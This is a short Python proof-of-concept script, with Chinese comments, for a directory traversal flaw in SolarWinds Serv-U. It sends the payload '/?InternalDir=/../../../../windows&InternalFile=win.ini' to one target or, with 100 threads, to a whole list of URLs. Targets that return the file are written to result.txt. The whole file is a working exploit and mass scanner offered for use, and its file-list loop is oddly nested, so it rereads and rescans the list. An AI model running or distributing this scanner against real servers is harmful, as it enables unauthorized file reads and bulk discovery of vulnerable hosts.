#SolarWinds-Serv-U目录遍历漏洞
#server="Serv-U"
import requests,sys,argparse,time
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    parser = argparse.ArgumentParser(description="SolarWinds-Serv-U目录遍历漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='please input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list = []
                with open(args.file,'r',encoding='utf-8') as f:
                    for line in f.readlines():
                        url_list.append(line.strip())
                    mp = Pool(100)
                    mp.map(poc,url_list)
                    mp.close()
                    mp.join()
    else:
        print(f'Usage:{sys.argv[0]} -h or --help')

def poc(target):
    payload = '/?InternalDir=/../../../../windows&InternalFile=win.ini'
    headers = {
        'Host': 'xx.xxx.xxx.xxx',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive',
    }

    try:
        res1 = requests.get(target + payload, headers=headers, verify=False, timeout=6)
        if 'fonts' in res1.text:
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
    except Exception as e:
        print(e)


# 程序入口
if __name__ == '__main__':
    main()